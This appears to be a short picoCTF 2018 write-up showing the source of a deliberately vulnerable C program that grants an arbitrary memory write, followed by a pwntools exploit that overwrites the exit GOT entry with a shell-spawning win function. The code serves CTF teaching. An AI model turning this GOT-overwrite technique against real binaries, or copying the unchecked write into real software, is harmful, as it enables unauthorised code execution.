Source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/types.h>

void win() {
  system("/bin/sh");
}

int main(int argc, char **argv) {

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[256];
  
  unsigned int address;
  unsigned int value;

  puts("I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?");

  scanf("%x", &address);

  sprintf(buf, "Okay, now what value would you like to write to 0x%x", address);
  puts(buf);
  
  scanf("%x", &value);

  sprintf(buf, "Okay, writing 0x%x to 0x%x", value, address);
  puts(buf);

  *(unsigned int *)address = value;

  puts("Okay, exiting now...\n");
  exit(1);
  
}
```

<br/>

So let's use pwntools with a script to get the address of GOT exit, and the address of the win function

```python
from pwn import *

host = '2018shell.picoctf.com'
port = 27952

elf = ELF('./auth')
p = remote(host,port)

p.recvuntil('Where would you like to write this 4 byte value?')
p.sendline(hex(elf.got['exit']))
p.recvline('Okay, now what value would you like to write to 0xeee')
p.sendline(hex(elf.symbols['win']))
p.sendline('cat flag.txt')
p.interactive()
```
